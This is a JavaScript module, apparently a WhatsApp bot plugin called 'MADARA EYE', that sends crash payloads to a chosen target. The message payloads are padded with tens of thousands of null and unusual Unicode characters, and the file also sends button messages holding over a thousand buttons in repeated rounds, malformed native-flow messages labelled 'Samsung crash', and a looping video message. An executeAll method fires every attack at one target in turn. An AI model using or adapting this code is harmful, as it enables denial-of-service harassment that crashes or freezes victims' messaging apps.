// ============ MADARA EYE — AGGRESSIVE (anti-disconnect) ============
// © MADARA X-MD INC. — max damage, session stays alive

'use strict';

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

const generateMessageTag = () => `\( {Date.now()}_ \){Math.random().toString(36).slice(2)}`;

// ============ EYE 1: IOS INVISIBLE FORCE (AGGRESSIVE) ============
const IosInvisibleForce = async (sock, target, options = {}) => {
  const {
    lat = 21.1266,
    lng = -11.8199,
    name = " ⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗𝐕𝐄𝐋𝐙͜͢-‣꙱\n",
    url = "https://t.me/rizxvelzdev",
    caption = "@MADARA_EYE",
    padCount = 45000,
    padChar = "\u0000",
    repeatCharCount = 35000,
    repeatString = "𑇂𑆵𑆴𑆿"
  } = options;

  const pad = padChar.repeat(padCount);
  const rep = repeatString.repeat(repeatCharCount);

  const locationMessage = {
    degreesLatitude: lat,
    degreesLongitude: lng,
    name: `\( {name} \){pad}${rep}`,
    url,
    contextInfo: {
      externalAdReply: {
        quotedAd: {
          advertiserName: rep,
          mediaType: 1,
          jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
          caption: `\( {caption} \){rep}`
        }
      }
    }
  };

  try {
    // Direct to target (status@broadcast is what usually kills the session)
    await sock.relayMessage(target, { locationMessage }, {
      messageId: generateMessageTag()
    });
  } catch (e) {
    console.error('[MadaraEye] IosInvisibleForce:', e.message);
  }

  return { success: true, eye: 'IosInvisibleForce', target };
};

// ============ EYE 2: BUTTON OVERFLOW (AGGRESSIVE) ============
const ButtonOverflowCrash = async (sock, target, options = {}) => {
  const {
    padChar = "ꦾ",
    padCount = 320000,
    buttonCount = 1200,
    contentPad = 35000,
    footerPad = 20000,
    extraRounds = 6,
    extraButtons = 350,
    roundDelay = 400
  } = options;

  const char = padChar.repeat(padCount);

  const makeButtons = (count, prefix = 'btn') => {
    const buttons = [];
    for (let b = 0; b < count; b++) {
      buttons.push({
        buttonId: `\( {prefix}_ \){b}`,
        buttonText: { displayText: `👁️ \( {prefix}_ \){b} ${char.substring(0, 400)}` },
        type: 1
      });
    }
    return buttons;
  };

  try {
    const firstPayload = {
      buttonsMessage: {
        contentText: `Madara Eye - Tr4sh Button${char.substring(0, contentPad)}`,
        footerText: `Madara Eye NovaZ${char.substring(0, footerPad)}`,
        buttons: makeButtons(buttonCount),
        headerType: 1,
        viewOnce: true
      }
    };

    await sock.relayMessage(target, firstPayload, {
      messageId: generateMessageTag()
    }).catch(() => {});

    for (let i = 0; i < extraRounds; i++) {
      await sleep(roundDelay);

      const roundPayload = {
        buttonsMessage: {
          contentText: `${char.substring(0, 25000)} Madara Eye Force ${i}`,
          buttons: makeButtons(extraButtons, `extra_${i}`),
          headerType: 1
        }
      };

      await sock.relayMessage(target, roundPayload, {
        messageId: generateMessageTag()
      }).catch(() => {});
    }
  } catch (e) {
    console.error('[MadaraEye] ButtonOverflow:', e.message);
  }

  return { success: true, eye: 'ButtonOverflow', target };
};

// ============ EYE 3: SAMSUNG CRASH (AGGRESSIVE) ============
const SamsungCrash = async (sock, target, options = {}) => {
  const {
    headerPad = 48000,
    headerChar = "ꦾ",
    paramsPad = 40000,
    paramsChar = "{",
    buttonIdPad = 8000,
    buttonTextPad = 8000,
    buttonTextChar = "\u0000",
    flowName = "cta_url"
  } = options;

  const flowParams = paramsChar.repeat(paramsPad);
  const header = headerChar.repeat(headerPad);

  try {
    const payload1 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: false,
              title: header
            },
            body: { text: " " },
            nativeFlowMessage: {
              messageParamsJson: flowParams
            }
          }
        }
      }
    };

    await sock.relayMessage(target, payload1, {
      messageId: generateMessageTag()
    }).catch(() => {});

    await sleep(350);

    const payload2 = {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            text: header,
            contentText: "Madara Eye",
            buttons: [{
              buttonId: paramsChar.repeat(buttonIdPad),
              buttonText: {
                displayText: buttonTextChar.repeat(buttonTextPad)
              },
              type: "NATIVE_FLOW",
              nativeFlowInfo: {
                name: flowName,
                paramsJson: flowParams
              }
            }],
            headerType: "TEXT"
          }
        }
      }
    };

    await sock.relayMessage(target, payload2, {
      messageId: generateMessageTag()
    }).catch(() => {});
  } catch (e) {
    console.error('[MadaraEye] SamsungCrash:', e.message);
  }

  return { success: true, eye: 'SamsungCrash', target };
};

// ============ EYE 4: LINK PREVIEW (kept usable) ============
const getBuffer = async (url) => {
  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return Buffer.from(await res.arrayBuffer());
  } catch {
    return Buffer.alloc(0);
  }
};

const LinkPreviewLoop = async (sock, chat, m, options = {}) => {
  const {
    urls = [
      "https://d.top4top.io/p_3829n9zbt1.jpg",
      "https://c.top4top.io/p_3829tp8hx1.jpg",
      "https://e.top4top.io/p_38291dfw01.jpg"
    ],
    link = "https://t.me/madaraeye",
    title = "MADARA EYE",
    description = "© MADARA X-MD INC.",
    cycles = 4,
    delay = 1200
  } = options;

  const finalText = m?.text?.includes(link) ? m.text : `\( {link}\n \){m?.text || 'MADARA EYE'}`;
  const messageId = generateMessageTag();

  try {
    const initialThumb = await getBuffer(urls[0]);
    await sock.sendMessage(chat, {
      text: finalText,
      linkPreview: {
        "matched-text": link,
        title,
        description,
        jpegThumbnail: initialThumb
      }
    }, { quoted: m, messageId });

    (async () => {
      for (let cycle = 0; cycle < cycles; cycle++) {
        for (const url of urls) {
          try {
            const jpegThumbnail = await getBuffer(url);
            await sock.sendMessage(chat, {
              text: finalText,
              linkPreview: {
                "matched-text": link,
                title,
                description,
                jpegThumbnail
              },
              edit: { remoteJid: chat, fromMe: true, id: messageId }
            });
          } catch {}
          await sleep(delay);
        }
      }
    })();
  } catch (e) {
    console.error('[MadaraEye] LinkPreview:', e.message);
  }

  return { success: true, eye: 'LinkPreviewLoop', chat };
};

// ============ EYE 5: VIDX NULL V2 (AGGRESSIVE) ============
const VIDEO_PAYLOAD = {
  url: "https://mmg.whatsapp.net/v/t62.7161-24/567947980_2421018691734575_7926376826768129509_n.enc?ccb=11-4&oh=01_Q5Aa4gF-BjyNpC_YzuPMNAtOuuJLbcC0t-iut6gNpAl4VACwuQ&oe=6A3B9B73&_nc_sid=5e03e0&mms3=true",
  mimetype: "video/mp4",
  fileSha256: "85W9wy9btWoxbdVu4cAiyhnxdwlsbtCQ2WaYdTo9w6w=",
  fileLength: "2726852",
  seconds: 27,
  mediaKey: "WJy9ZdiTPAIdcOhRfn0Oe2CIN4RnE0b1RSs8Skw/n18=",
  height: 850,
  width: 474,
  fileEncSha256: "ZH92J7p2igl823VuiawCBerbEKSU6dfFIGaWZVESY0Q=",
  directPath: "/v/t62.7161-24/567947980_2421018691734575_7926376826768129509_n.enc?ccb=11-4&oh=01_Q5Aa4gF-BjyNpC_YzuPMNAtOuuJLbcC0t-iut6gNpAl4VACwuQ&oe=6A3B9B73&_nc_sid=5e03e0",
  mediaKeyTimestamp: "1779710503",
  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAwQFAgEGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD5lN6QJxAuCH3Q7XN7v2EzU6LaatNV0E+porTFhze4FiqS8ammhZ1lDfMAD//EACQQAAIDAAIBAwUBAAAAAAAAAAECAAMREiEEEyBREBQiQUJh/9oACAEBAAE/APbgmD4mCYBN0E8RACfoIFJiBTU+nuVUVFx2T1+ofFrDjQQIKUW0kdqstVb0DIuZDXxE+2C9hoU1fybkJcxVSEiCwEBnOGLQpX5hUiWXcUIEexswiUPzdQzYBFVSOjLCM2Wn1CB/s8qzm80zwLXD8SSRH8hG/sZPUr3to/FnJ5DIGAaJYiEMGHZ793//xAAYEQADAQEAAAAAAAAAAAAAAAAAASARMf/aAAgBAgEBPwCNNFC4OP/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAEDAQE/AOwmmLH/2Q==",
  contextInfo: {
    remoteJid: "status@broadcast",
    quotedMessage: { conversation: "" },
    participant: null,
    pairedMediaType: "NOT_PAIRED_MEDIA",
    mentionedJid: ["0@s.whatsapp.net"],
    isForwarded: true,
    forwardingScore: 999
  },
  caption: "👁️⃟-𝗠𝗔𝗗𝗔𝗥𝗔-𝗘𝗬𝗘 > \"Infinite Tsukuyomi\"" + "ꦽ".repeat(4000)
};

const VidxNullV2 = async (client, target, options = {}) => {
  try {
    const payload = {
      ...VIDEO_PAYLOAD,
      ...(options.videoData || {}),
      contextInfo: {
        ...VIDEO_PAYLOAD.contextInfo,
        ...(options.videoData?.contextInfo || {}),
        participant: target
      }
    };

    await client.relayMessage(target, {
      videoMessage: payload
    }, {
      messageId: generateMessageTag()
    });
  } catch (e) {
    console.error('[MadaraEye] VidxNullV2:', e.message);
    return { success: false, eye: 'VidxNullV2', target, error: e.message };
  }

  return { success: true, eye: 'VidxNullV2', target };
};

const VidxNullLoop = async (client, target, iterations = 8, delay = 900) => {
  const results = [];
  for (let i = 0; i < iterations; i++) {
    results.push(await VidxNullV2(client, target));
    await sleep(delay);
  }
  return results;
};

// ============ CLASS ============
class MadaraEye {
  constructor(sock) {
    this.sock = sock;
  }

  async iosInvisibleForce(target, options = {}) {
    return IosInvisibleForce(this.sock, target, options);
  }

  async buttonOverflow(target, options = {}) {
    return ButtonOverflowCrash(this.sock, target, options);
  }

  async samsung(target, options = {}) {
    return SamsungCrash(this.sock, target, options);
  }

  async linkPreviewLoop(chat, m, options = {}) {
    return LinkPreviewLoop(this.sock, chat, m, options);
  }

  async vidxNull(target, options = {}) {
    return VidxNullV2(this.sock, target, options);
  }

  async vidxNullLoop(target, iterations = 8, delay = 900) {
    return VidxNullLoop(this.sock, target, iterations, delay);
  }

  async executeAll(target, m, options = {}) {
    const results = [];
    results.push(await this.iosInvisibleForce(target, options.ios));
    await sleep(400);
    results.push(await this.buttonOverflow(target, options.button));
    await sleep(400);
    results.push(await this.samsung(target, options.samsung));
    await sleep(400);
    if (m) results.push(await this.linkPreviewLoop(target, m, options.preview));
    results.push(await this.vidxNull(target, options.vidx));
    return results;
  }
}

module.exports = {
  MadaraEye,
  IosInvisibleForce,
  ButtonOverflowCrash,
  SamsungCrash,
  LinkPreviewLoop,
  VidxNullV2,
  VidxNullLoop,
  VIDEO_PAYLOAD,
  sleep,
  getBuffer
};